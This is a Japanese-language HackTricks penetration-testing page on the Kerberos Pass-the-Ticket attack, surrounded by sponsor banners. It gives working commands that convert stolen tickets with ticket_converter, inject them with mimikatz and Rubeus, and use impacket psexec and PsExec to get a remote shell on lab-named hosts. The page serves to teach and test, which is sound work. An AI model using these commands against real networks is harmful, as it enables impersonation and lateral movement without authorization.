# チケットの渡し方

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする。
* **ハッキングテクニックを共有する** には、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) を使用して、世界で最も高度なコミュニティツールによって強化された **ワークフローを簡単に構築** および **自動化** します。\
今すぐアクセスを取得:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## チケットの渡し方（PTT）

**チケットの渡し方（PTT）** 攻撃方法では、攻撃者は **ユーザーの認証チケットを盗みます** パスワードやハッシュ値ではなく。この盗まれたチケットは、ユーザーを **なりすまして** ネットワーク内のリソースやサービスに **不正アクセス** します。

**読む**:

* [Windows からのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
* [Linux からのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Linux と Windows のチケットをプラットフォーム間で交換する**

[**ticket\_converter**](https://github.com/Zer1t0/ticket\_converter) ツールは、チケット自体と出力ファイルだけを使用してチケット形式を変換します。
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
### チケット渡し攻撃

Windowsでは[Kekeo](https://github.com/gentilkiwi/kekeo)を使用できます。

{% code title="Linux" %}
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Windows" %}
```bash
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
{% endcode %}

## 参考

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も先進的なコミュニティツールによって **パワード** された **ワークフローを簡単に構築** および **自動化** します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> で **ゼロからヒーローまでのAWSハッキングを学ぶ**</summary>

HackTricks をサポートする他の方法：

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする
* **HackTricks** および **HackTricks Cloud** の github リポジトリに PR を提出して、あなたのハッキングトリックを共有する

</details>
